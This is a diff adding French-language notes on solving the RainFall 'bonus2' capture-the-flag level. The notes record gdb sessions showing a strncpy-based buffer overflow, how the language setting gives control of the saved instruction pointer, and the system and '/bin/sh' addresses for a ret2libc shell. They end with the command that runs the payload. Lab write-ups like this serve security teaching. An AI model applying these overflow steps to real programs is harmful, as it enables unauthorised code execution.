@@ -1,0 +1,49 @@
+bonus2@RainFall:~$ ./bonus2 AAAA AAAA -> Hello AAAA
+
+Avec 1 ou 3 arguments il ne se passe rien.
+
+bonus2@RainFall:~$ ./bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAA BBBB
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB -> overflow ?
+
+bonus2@RainFall:~$ ./bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Segmentation fault (core dumped) -> on a surement un overflow quelque part !
+
+Le strncpy ne met pas de '\0' si la longeur de la string a copier est plus grande que
+la longeur n, c'est ce qu'on va utiliser pour overflow.
+
+Dans gdb, je vais chercher quel argument overflow et où :
+r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB 
+-> Program received signal SIGSEGV, Segmentation fault. 0x08004242 in ?? ()
+
+Le deuxième argument overwrite l'eip.
+r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAABBBBCCCDDDEEEFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM
+-> Program received signal SIGSEGV, Segmentation fault. 0x08004949 in ?? ()
+
+4949 correspond à "II", on segfault donc à partir d'ici. On peut cependant constater
+que seul les deux derniers bytes sont overwrite et cela peut importe la longueur des
+deux inputs. Si on veut pouvoir inserer une adresse ici on va donc avoir un soucis.
+
+En dessassamblant le programme on a pu voir que plusieurs langues étaient disponibles.
+Si on change la langue set dans les variables d'environnement le message de retour 
+change. Si je set ma langue sur fi et que je relance le programme, il va encore 
+segfault, pas au même endroit mais cette fois toute l'adresse sera overwrite :
+r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAABBBBCCCDDDEEEFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM
+-> Program received signal SIGSEGV, Segmentation fault. 0x47474646 in ?? ()
+
+0x47474646 correspond à "GGFF"
+
+shellcode dans variable d'environnement encore ? -> ne semble pas marcher
+
+lancer system avec /bin/sh ?
+-> adresse system 0xb7e6b060
+-> adresse /bin/sh 0xb7f8cc58
+
+Pour trouver l'adresse de /bin/sh : 
+info proc map 
+find 0xb7e2c000,0xb7fcf000, "/bin/sh"
+
+Il ne reste plus qu'à construire le payload et lancer le programme avec !
+./bonus2 `cat /tmp/input1` `cat /tmp/bonus2`
